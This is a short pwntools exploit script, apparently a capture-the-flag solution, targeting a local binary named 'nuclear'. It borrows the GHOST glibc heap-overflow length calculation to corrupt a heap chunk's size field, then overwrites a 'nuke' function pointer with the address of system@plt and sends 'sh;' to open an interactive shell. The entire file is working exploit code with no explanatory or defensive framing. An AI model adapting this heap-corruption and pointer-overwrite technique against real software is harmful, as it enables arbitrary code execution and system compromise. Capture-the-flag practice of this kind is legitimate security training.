from pwn import *
elf = context.binary = ELF("./nuclear")
io = process("./ld-linux-x86-64.so.1 --library-path . ./nuclear",shell=True)
#io = remote("0.0.0.0",9013)

# From GHOST PoC
# strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1;
# size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;

# Stage 1
# Overwrite g_buf2->size with a big value (0x3030)
len = 0x404 - 16 * 1 - 2 * 8 - 1
payload = b"0" * (len - 8) + b"0"*5            # padding + g_buf2->prev_size
payload += b"00"                             # g_buf2->size 

# Stage 2
# Overwrite 'nuke' pointer with 'system'
# 0x0b, 0x20 badchars
payload2 = b"y" * 1016 + b"\x26\x08\x40\x00"  # system@plt + 6

io.sendline(b"2")
io.sendline(payload)
io.sendline(b"3")
io.sendline(payload2)
io.sendline(b"2\nsh;")

io.interactive()